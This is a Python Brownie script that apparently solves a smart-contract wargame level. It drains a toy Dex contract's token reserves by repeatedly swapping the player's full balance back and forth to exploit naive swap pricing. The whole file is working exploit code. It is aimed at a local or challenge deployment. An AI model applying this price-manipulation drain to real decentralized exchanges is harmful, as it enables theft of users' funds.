from brownie import Contract, Dex, Token1, Token2, network, config
from ...helpful_scripts import get_account, LOCAL_BLOCKCHAIN_ENVIRONMENTS
from web3 import Web3


def attack():
    account = get_account()

    if network.show_active() in LOCAL_BLOCKCHAIN_ENVIRONMENTS:

        web3 = Web3(Web3.HTTPProvider("http://127.0.0.1:8545"))

        token1 = Token1.deploy({"from": get_account(index=1)})
        token2 = Token2.deploy({"from": get_account(index=1)})

        dex = Dex.deploy(
            token1,
            token2,
            {"from": get_account(index=1)},
        )

        token1.transfer(dex, 100, {"from": get_account(index=1)}).wait(1)
        token1.transfer(account, 10, {"from": get_account(index=1)}).wait(1)

        token2.transfer(dex, 100, {"from": get_account(index=1)}).wait(1)
        token2.transfer(account, 10, {"from": get_account(index=1)}).wait(1)

        token1.approve(dex, 10000, {"from": account}).wait(1)
        token2.approve(dex, 10000, {"from": account}).wait(1)

    else:

        web3 = Web3(
            Web3.HTTPProvider(
                config["networks"][network.show_active()]["infura"]
            )
        )

        dex = Contract.from_abi(
            Dex._name,
            config["networks"][network.show_active()]["dex"],
            Dex.abi,
        )

    print(f"Dex token1 balance is {dex.balanceOf(dex.token1(), dex)}")
    print(f"Dex token2 balance is {dex.balanceOf(dex.token2(), dex)}")
    print(f"Player token1 balance is {dex.balanceOf(dex.token1(), account)}")
    print(f"Player token2 balance is {dex.balanceOf(dex.token2(), account)}")

    flip = True

    dex.approve(dex, 10000, {"from": account}).wait(1)

    while dex.balanceOf(dex.token1(), dex) > 0 and dex.balanceOf(dex.token2(), dex) > 0:

        if flip:
            flip = False
            dex_token1_balance = dex.balanceOf(dex.token1(), dex)
            account_token1_balance = dex.balanceOf(dex.token1(), account)
            amount = min(account_token1_balance, dex_token1_balance)
            dex.swap(
                dex.token1(),
                dex.token2(),
                amount,
                {"from": account},
            ).wait(1)
        else:
            flip = True
            dex_token2_balance = dex.balanceOf(dex.token2(), dex)
            account_token2_balance = dex.balanceOf(dex.token2(), account)
            amount = min(account_token2_balance, dex_token2_balance)
            dex.swap(
                dex.token2(),
                dex.token1(),
                amount,
                {"from": account},
            ).wait(1)

    print(f"Dex token1 balance is {dex.balanceOf(dex.token1(), dex)}")
    print(f"Dex token2 balance is {dex.balanceOf(dex.token2(), dex)}")


def main():
    attack()
